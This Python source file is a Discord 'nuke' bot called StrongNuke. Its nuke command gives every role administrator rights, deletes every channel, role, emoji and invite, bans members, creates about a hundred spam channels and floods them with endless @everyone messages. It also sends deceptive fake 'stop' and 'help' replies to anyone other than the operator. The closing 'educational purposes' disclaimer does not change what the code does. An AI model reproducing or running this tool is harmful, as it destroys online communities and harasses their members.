import discord
from discord.ext import commands
import random
import subprocess
import asyncio
from discord import Permissions
import os
import threading  # run code concurrently
from pyperclip import copy
# we want to use multiprocessing instead of threading since processes are more efficient
import multiprocessing
import pprint
import requests
import json
from colorama import init, Fore as cc
from colorama import Fore
from sys import exit
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET
print("Loading modules...")
os.system("cls")


def displayStrongNuke():
    print(Fore.RED + "Please note that your computer may overheat or use a lot of CPU using StrongNuke, this is mainly because of the speed and requests being sent to actually nuke servers. Enjoy nuking servers!" + Fore.RESET)
    print(Fore.BLUE + "Made by Spinach#3369" + Fore.RESET)
    print(Fore.CYAN + """
░██████╗████████╗██████╗░░█████╗░███╗░░██╗░██████╗░███╗░░██╗██╗░░░██╗██╗░░██╗███████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔════╝░████╗░██║██║░░░██║██║░██╔╝██╔════╝
╚█████╗░░░░██║░░░██████╔╝██║░░██║██╔██╗██║██║░░██╗░██╔██╗██║██║░░░██║█████═╝░█████╗░░
░╚═══██╗░░░██║░░░██╔══██╗██║░░██║██║╚████║██║░░╚██╗██║╚████║██║░░░██║██╔═██╗░██╔══╝░░
██████╔╝░░░██║░░░██║░░██║╚█████╔╝██║░╚███║╚██████╔╝██║░╚███║╚██████╔╝██║░╚██╗███████╗
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝""")

# I'm going to fix it deleting already nuked roles :D (after the channel problem)
displayStrongNuke()


# using webhooks to display messages feature is highly experimental and so you'll have to go into the code to enable it 
# (it gets less pings since it ratelimits IPs faster so if you want 30 pings only, go ahead)





















token = input(f"{g}Input bot token: {c}")
prefix = input(f"{m}Input bot prefix: {b}")
webhook_name = ""
tag = ""
user_id = 0 
tagBanned = False
identityProtection = True
role_spamn = ["Annihilated!", "Obliterated!",
              "Nuked!", "Decimated!"] 
role_amount = 100
channels_created = 100
authorized = [user_id, "0", "0"]
SPAM_CHANNEL = ["Nuked!", "Annihilated!",
                "Eradicated!", "Decimated!", "Incinerated!"]
SPAM_MESSAGE = ["Dang, you got nuked!",
                "Absolutely anihilated!", "Dang man! Nice server!", "You got absolutely decimated!", "It's a beautiful server now mate.", "Beautiful server.", "Imagine messing with the wrong people xD", "How about NUKE", "These are some words I have: Decimated, Annihilated, Eradication, Incinerated, and you just got rekt."]  # Spam ping names
client = commands.Bot(command_prefix=prefix)




































client.remove_command("help")
print(Fore.RED + f"To nuke: type {prefix}nuke" + Fore.RESET)
presence = "with you!"
print(Fore.RED +
      f"Nuking ready: Type {prefix}nuke to start the nuking process." + Fore.RESET)
copy(f"{prefix}nuke")
print(Fore.BLUE + "Copied nuke command to clipboard!" + Fore.RESET)
print(Fore.BLUE + "(!) Please note that if the Discord Server has Community enabled, it won't delete some channels." + Fore.RESET)


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name=presence))


@client.command()
async def stop(ctx):
    if ctx.author.id == user_id:
        await ctx.author.send("Currently stopping the bot!")
        await client.close()
        print(Fore.GREEN +
          f"{client.user.name} has logged out successfully." + Fore.RESET)
    else:
        await ctx.author.send("Currently stopping the bot!")
        print(Fore.RED + "Fake stop message sent to user" + Fore.RESET) 


@stop.error
async def stop_error(ctx, error):
    if isinstance(error, commands.NotOwner):
        await ctx.send("You can't use this command!")


@client.command()
async def rolespam(ctx):
    for i in range(role_amount+1):
        print(
            Fore.RED + f"Started spamming roles!")
        await ctx.guild.create_role(name=random.choice(role_spamn))
# roleSpamThread = Thread(target=rolespam)


@rolespam.error
async def rolespam_error(ctx, error):
    await ctx.author.send(f"An error occured- {str(error)}")

print(Fore.RED + "Note that sometimes, our PreventDeletion of already nuked channels fails. This is completely normal. At least the server is already nuked!")


@client.command()
async def say(ctx, *, msgsay):
    async def do():
        await ctx.message.delete()
        await ctx.send(msgsay)
    t = threading.Thread(target=do).start()


@say.error
async def say_error(ctx, error):
    await ctx.author.send(f"An error occured- {str(error)}")


@client.command(aliases=["annihilate","decimate","eradicate","obliterate","destroy"])
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    try:
        for role in ctx.guild.roles:
            role = discord.utils.get(guild.roles, name=role)
            # why not give everyone admin
            await role.edit(permissions=Permissions.all())
    except:
        pass
    for channel in guild.channels:
        try:
            channelVar = str(channel.name)
            if channelVar in SPAM_CHANNEL or channelVar.lower().strip() in SPAM_CHANNEL:
                print(Fore.GREEN + "Prevented deletion of already nuked channels!")
                #I try in many ways to make the antichanneldeletion work
            else:
                await channel.delete()
                print(Fore.MAGENTA +
                      f"{channel.name} was deleted." + Fore.RESET)
        except Exception as err:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
            print(Fore.RED + f"Channel delete error -{str(err)}" + Fore.RESET)
    for member in guild.members:
        try:
            if member in authorized:
                print(
                    Fore.RED + f"{member.name}#{member.discriminator} Was unable to be banned: ADMIN DETECTED" + Fore.RESET)
            else:
                await member.ban()
                print(
                    Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
        except:
            print(
                Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN +
                  f"{role.name} Has not been deleted" + Fore.RESET)
    # try:
    #   roleSpamThread = Thread(target=rolespam)
    #   roleSpamThread.start()
    # except:
    #   print(Fore.RED + "Role spamming has not been enabled." + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban(user)
            print(
                Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
        except:
            print(
                Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    for invite in await guild.invites():
        if invite.inviter in authorized:
            print(Fore.CYAN + "Prevented deletion of Authorized Invite" + Fore.RESET)
        else:
            print(
                Fore.RED + f"Deleted an invite to {guild.name}." + Fore.RESET)
        await invite.delete()  # no proof!!

    async def create():
        for i in range(channels_created):
            await guild.create_text_channel(str(random.choice(SPAM_CHANNEL)))
            print(Fore.GREEN + "Created text channel!" + Fore.RESET)
            await guild.create_voice_channel(str(random.choice(SPAM_CHANNEL)))
            print(Fore.CYAN + "Created voice channel!" + Fore.RESET)
    await create()
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    print(f"Obliterated {guild.name} Successfully.")
    return


@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, discord.errors.HTTPException):
        print(
            Fore.RED + "The bot is ratelimited! This shows that the server has reached over 1,000 pings! [CODE: 1]" + Fore.RESET)


@client.command()
async def pingall(ctx):
    await ctx.message.delete()
    await ctx.channel.send("@everyone", delete_after=0)


@pingall.error
async def pingall_error(ctx, error):
    await ctx.author.send(f"Surprisingly. There has been an error with the **PINGALL** command! __{str(error)}__")


@client.command(aliases=['membercount', 'mcount', "scount", 'members', "servercount"])
async def memcount(ctx):
    await ctx.channel.send("There are " + str(ctx.message.guild.member_count) + " members in the server!")


@memcount.error
async def memcount_error(ctx, error):
    await ctx.author.send(f"Surprisingly. You're messing with the bot! Here's the error you gave. __{str(error)}__")


@client.event
async def on_guild_channel_create(channel):
    try:
        async def startSpam():
            while True:
                # create = await channel.create_webhook(name=webhook_name)
                if identityProtection == True:
                    await channel.send("@everyone | " + random.choice(SPAM_MESSAGE))
                    print(Fore.YELLOW + "Sent @everyone message!" + Fore.RESET)
                    # await create.send("@everyone | " + random.choice(SPAM_MESSAGE))
                    # print(Fore.YELLOW + "Sent @everyone message!" + Fore.RESET)
                else:
                    await channel.send("@everyone | " + random.choice(SPAM_MESSAGE) + f" -{tag}")
                    print(Fore.YELLOW + "Sent @everyone message!" + Fore.RESET)
                    # await create.send("@everyone | " + random.choice(SPAM_MESSAGE) + f" -{tag}")
                    # print(Fore.YELLOW + "Sent @everyone message!" + Fore.RESET)
        if channel.type in (discord.ChannelType.voice, discord.ChannelType.text):
            if channel.type == discord.ChannelType.voice:
                pass
            else:
                await startSpam()
    except Exception as err:
        if isinstance(err, discord.errors.HTTPException):
            print(
                Fore.RED + "The bot has been ratelimited! [CODE: 2]" + Fore.RESET)


@client.command()
async def vcspam(ctx):
    guild = ctx.guild
    print(Fore.CYAN + "Started spamming VCs!" + Fore.RESET)
    for i in range(channels_created):
        await guild.create_voice_channel(str(random.choice(SPAM_CHANNEL)))


@vcspam.error
async def vcspam_error(ctx, error):
    await ctx.author.send(f"Stop messing with the bot bro! __{str(error)}__")


@client.command()
async def help(ctx):
    try:
        if ctx.author.id in authorized:  # make sure to input real alt accounts and tags or else no help command
            await ctx.author.send(f"""
{prefix}help - shows this message
{prefix}nuke - nukes the server
{prefix}pingall - pings everyone
{prefix}stop - logs the bot out
{prefix}rolespam - spams roles
{prefix}memcount - shows the amount of members in the server
{prefix}vcspam - spams half channels (highly unrecommended as {prefix}nuke does it as well)""")
        else:
            # fake help message
            await ctx.author.send("Hello there! The **HELP** message is currnetly being developed! Remember: It'll be here soon!")
    except:
        await ctx.send("Your DMs aren't enabled! Enable them to get the message.")


@help.error
async def help_error(ctx, error):
    await ctx.author.send(f"A super rare **HELP** error has occured! __{str(error)}__")


@client.command(pass_context=True, aliases=['dmsend', 'dm'])
async def senddm(ctx, userID, *, text):
    user = await client.get_user(userID)
    await user.send(text)

# @senddm.error
# async def senddm_error(ctx,error):
#     if isinstance(error, )

# Still being developed!

client.run(token, bot=True)
displayStrongNuke()
input(Fore.RED + "The code has successfully ran. After this, the process will terminate itself. Press enter to close. >>> ")
os.system(f"taskkill /f /im {__file__}")
quit()


# Developer's message (idk)

"""
First of all. I created this tool for educational
purposes only. I am not responsible for any actions
you take using this tool.

Second of all.
I don't know what the developer's message is but
you should still understand, that I AM NOT RESPONSIBLE.

Third of all.

Spinach#3369

"""
